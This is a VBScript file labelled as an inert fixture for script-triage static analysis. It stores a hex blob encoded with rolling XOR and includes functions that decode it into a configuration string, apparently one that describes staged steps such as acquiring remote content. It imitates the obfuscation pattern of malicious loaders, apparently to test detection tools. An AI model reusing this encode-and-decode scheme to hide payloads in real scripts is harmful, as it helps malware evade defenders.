Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ab3b9205 = "30-0d-3c-40-33-47-22-52-21-1c-7d-1e-6f-1a-73-01-64-3b-49-2c-41-2e-5a-3f-13-64-16-7f-0b-6e-31-57-3e-52-37-4b-2a-4e-2f-5f-2b-4e-3c-01-4c-25-46-34-5b-28-47-21-55-7b-23-6e-22-6a-3e-6a-3a-46-35-41-20-47-22-7d-1e-71-04-6a-1e-23-11-6d-0e-6f-02-72-13-7a-1d-73-2c-45-21-1c-7f-1e-73-03-62-0b-6c-02-2f-19-2b-4f-2a-12-77-40-23-11-77-0b-7e-0c-60-5d-35-41-35-45-36-0c-23-0c-3a-08-6c-09-31-54-63-00-32-54-7a-1f-67-06-6b-1b-77-12-3c-55-3b-4d-2c-40-29-4d-62-54-35-57-36-0e-3e-08-6c-42-26-47-33-4f-3a-49-2c-5e-01-60-07-62-0c-78-45-0d-78-16-62-10-75-06-75-39-58-3a-15-23-11-75-10-28-4d-7a-19-2b-4d-31-57-3e-52-37-68-18-79-0d-65-58-1b-21-7d-28-5b-3e-4c-3f-63-33-46-24-48-21-42-1e-56-23-4d-39-4b-2e-5d-2e-62-03-61-3d-4e-3a-5b-3c-59-74-42-70-14-71-49-2c-1b-78-4a-2c-02-66-07-73"
Const Codec_ab3b9205 = "hex_dash|rolling_xor|46"

Function Load_ab3b9205()
  Dim parts, result(), materialIndex
  parts = Split(Material_ab3b9205, "-")
  ReDim result(UBound(parts))
  For materialIndex = 0 To UBound(parts)
    result(materialIndex) = CInt("&H" & parts(materialIndex))
  Next
  Load_ab3b9205 = result
End Function

Function Decode_ab3b9205(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  previous = 70
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor previous
    previous = storedMaterial(materialIndex)
  Next
  Decode_ab3b9205 = result
End Function

Function Recover_ab3b9205()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  harmlessValue = Join(Array("north", "south"), ":")

  storedMaterial = Load_ab3b9205()

  decodePass = 0

  While decodePass < 1

    recoveredMaterial = Decode_ab3b9205(storedMaterial)

    decodePass = decodePass + 1

  Wend

  configurationText = ""

  For materialIndex = 0 To UBound(recoveredMaterial)

    configurationText = configurationText & Chr(recoveredMaterial(materialIndex))

  Next
  Recover_ab3b9205 = configurationText
End Function

Function Inspect_ab3b9205()
  Inspect_ab3b9205 = Recover_ab3b9205()
End Function
